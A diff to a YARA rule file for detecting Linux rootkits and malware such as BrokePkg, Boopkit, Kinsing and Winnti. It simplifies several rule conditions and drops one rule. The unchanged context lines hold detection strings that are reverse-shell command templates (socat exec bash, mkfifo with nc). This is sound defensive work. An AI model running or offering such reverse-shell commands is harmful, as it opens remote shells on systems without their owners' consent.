@@ -43,16 +43,7 @@ rule BrokePkg_Generic {
     $ = "socat openssl-connect:%s:%s,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane" fullword ascii
     $ = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" fullword ascii
   condition:
-    elf_rel and
-    (
-      for 3 f_dynsym in elf.dynsym:
-      (
-        for any f_name in ("fh_install_hooks", "port_hide", "hide_pid"):
-        (
-          f_dynsym.type == elf.STT_FUNC and f_dynsym.name == f_name
-        )
-      ) or 2 of them
-    )
+    elf_rel and 2 of them
 }
 
 rule Symbiote_a0d1 {
@@ -98,41 +89,10 @@ rule Boopkit_Generic {
     $ = "boopkit." fullword ascii
     $ = "Found RCE" fullword ascii
     $ = "X*x.HALT.x*X" fullword ascii
+    $ = "runtime__boopkit" fullword ascii
+    $ = "pid_to_hide" fullword ascii
   condition:
-    elf_exec and
-    (
-      for any f_symtab in elf.symtab:
-      (
-        for any symbol_name in ("boopprintf", "rce_filter", "runtime__boopkit"):
-        (
-          f_symtab.name == symbol_name and
-          (
-            f_symtab.type == elf.STT_FUNC or
-            f_symtab.type == elf.STT_OBJECT
-          )
-        )
-      ) or 2 of them
-    )
-}
-
-
-rule Boopkit_Lib {
-  // Detect .so file of boopkit "https://github.com/krisnova/boopkit
-  // Export:
-  // __packed, LICENSE object (multiple files)
-  // pid_to_hide object, pr0be.safe.so
-  condition:
-    elf_magic and
-    (
-      for any f_symtab in elf.symtab:
-      (
-        for any symbol_name in ("__packed", "pid_to_hide"):
-        (
-          f_symtab.name == symbol_name and
-          f_symtab.type == elf.STT_OBJECT
-        )
-      )
-    )
+    elf_exec and 2 of them
 }
 
 
@@ -607,17 +567,7 @@ rule Kinsing_ccef {
     $ = "%d (%[^)]s" fullword ascii
     $ = "chopN" fullword ascii
   condition:
-    elf_dyn and
-    (
-      for 2 f_dynsym in elf.dynsym:
-      (
-        for any f_name in ("is_hidden_file", "is_attacker", "hide_tcp_ports"):
-        (
-          f_dynsym.type == elf.STT_FUNC and
-          f_dynsym.name == f_name
-        )
-      ) or all of them
-    )
+    elf_dyn and all of them
 }
 
 
@@ -644,17 +594,7 @@ rule Winnti_1acb {
     $ = "cmdlineH" fullword ascii
     $ = "is_invisible_with_pids" fullword ascii
   condition:
-    elf_dyn and
-    (
-      for 2 f_dynsym in elf.dynsym:
-      (
-        for any f_name in ("is_invisible_with_pids", "get_our_pids", "get_our_sockets", "check_is_our_proc_dir"):
-        (
-          f_dynsym.type == elf.STT_FUNC and
-          f_dynsym.name == f_name
-        )
-      ) or 2 of them
-    )
+    elf_dyn and all of them
 }
 
 
@@ -720,14 +660,7 @@ rule Userland_bc62 {
     $ = "LD_PRELOH" fullword ascii
     $ = "lib0pus.so" fullword ascii
   condition:
-    elf_dyn and (
-      for 2 f_dyn in elf.dynsym: (
-        for any f_name in ("is_file_hidden", "fake_map"):
-        (
-          f_dyn.name == f_name and f_dyn.type == elf.STT_FUNC
-        )
-      ) or 2 of them
-    )
+    elf_dyn and all of them
 }
 
 
